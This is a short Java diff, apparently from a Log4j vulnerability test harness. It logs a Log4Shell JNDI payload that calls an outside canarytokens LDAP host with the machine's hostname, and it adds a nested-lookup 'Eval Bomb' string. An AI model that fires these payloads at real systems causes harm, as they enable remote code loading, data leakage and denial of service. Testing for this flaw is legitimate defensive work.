@@ -24,16 +24,20 @@ public class Main implements Runnable {
     @Override
     public void run() {
         final String CVE_2021_4428 = "${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}";
-        trigger("CVE-2021-44228", args.length > 0 ? args[0] : CVE_2021_4428);
+        trigger(0, "CVE-2021-44228", CVE_2021_4428);
+
+        final String BOMB = "${${::-${::-$${::-j}}}}";
+        trigger(1, "Eval Bomb", BOMB);
     }
 
     private void trigger(
+        final int arg,
         final String description,
         final String gadget
     ) {
         final long ts = System.currentTimeMillis();
         LOG.info("Triggering {}", description);
-        LOG.info("Trigger: " + gadget);
+        LOG.info("Trigger: " + (args.length > arg ? args[arg] : gadget));
         LOG.info("That took {}ms", System.currentTimeMillis() - ts);
     }
 
